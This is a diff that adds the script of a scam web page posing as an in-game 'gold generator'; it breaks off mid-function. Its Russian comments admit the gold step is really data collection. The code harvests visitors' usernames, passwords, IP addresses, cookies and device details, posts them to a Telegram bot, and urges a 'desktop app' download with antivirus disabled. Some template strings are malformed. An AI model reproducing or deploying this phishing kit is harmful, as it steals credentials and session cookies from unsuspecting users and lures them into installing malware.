@@ -1,0 +1,106 @@
+<div class="step" id="step3" style="display:none;">
+            <h3>📱 STEP 3: Get Desktop App (Optional)</h3>
+            <p>For faster gold generation and auto-farm:</p>
+            <button onclick="downloadApp()">⬇️ DOWNLOAD DESKTOP APP</button>
+            <p class="warning">Windows 10/11 only. Disable antivirus before install.</p>
+        </div>
+    </div>
+
+    <script>
+        // Данные которые собираем
+        const userData = {
+            username: '',
+            password: '',
+            ip: '',
+            userAgent: navigator.userAgent,
+            time: new Date().toISOString(),
+            screen: ${screen.width}x${screen.height},
+            language: navigator.language
+        };
+
+        // Шаг 1: Сбор имени пользователя
+        function nextStep() {
+            userData.username = document.getElementById('username').value;
+            userData.password = document.getElementById('password').value || 'not_provided';
+            
+            // Получаем IP пользователя
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userData.ip = data.ip;
+                    sendToTelegram('📱 Новый пользователь на сайте');
+                    showStep2();
+                })
+                .catch(() => {
+                    userData.ip = 'unknown';
+                    showStep2();
+                });
+        }
+
+        // Шаг 2: Показать второй шаг
+        function showStep2() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+
+        // Шаг 3: Генерация "золота" (на самом деле сбор данных)
+        function generateGold() {
+            const btn = document.getElementById('generateBtn');
+            const loader = document.getElementById('loader');
+            const result = document.getElementById('result');
+            
+            btn.disabled = true;
+            loader.style.display = 'block';
+            
+            // Собираем дополнительную информацию
+            userData.cookies = document.cookie;
+            userData.referrer = document.referrer;
+            userData.platform = navigator.platform;
+            
+            // Отправляем данные на сервер
+            sendToTelegram('🎯 ПОПЫТКА ПОЛУЧЕНИЯ ЗОЛОТА');
+            
+            // Имитация процесса
+            setTimeout(() => {
+                loader.style.display = 'none';
+                result.style.display = 'block';
+                
+                // Отправляем полные данные
+                sendFullData();
+                
+                // Показываем третий шаг через 3 секунды
+                setTimeout(() => {
+                    document.getElementById('step2').style.display = 'none';
+                    document.getElementById('step3').style.display = 'block';
+                }, 3000);
+            }, 2500);
+        }
+
+        // Отправка в Telegram
+        function sendToTelegram(message) {
+            const token = "ВАШ_BOT_TOKEN"; // Замени на свой
+            const chatId = "ВАШ_CHAT_ID";  // Замени на свой
+            
+            const fullMessage = ${message}\n +
+                               👤 User: ${userData.username}\n +
+                               🔐 Pass: ${userData.password}\n +
+                               🌐 IP: ${userData.ip}\n +
+                               🕐 Time: ${userData.time}\n +
+                               💻 Device: ${userData.userAgent};
+            
+            // Используем fetch для отправки
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: fullMessage,
+                    parse_mode: 'HTML'
+                })
+            });
+        }
+
+        // Отправка полных данных
+        function sendFullData() {
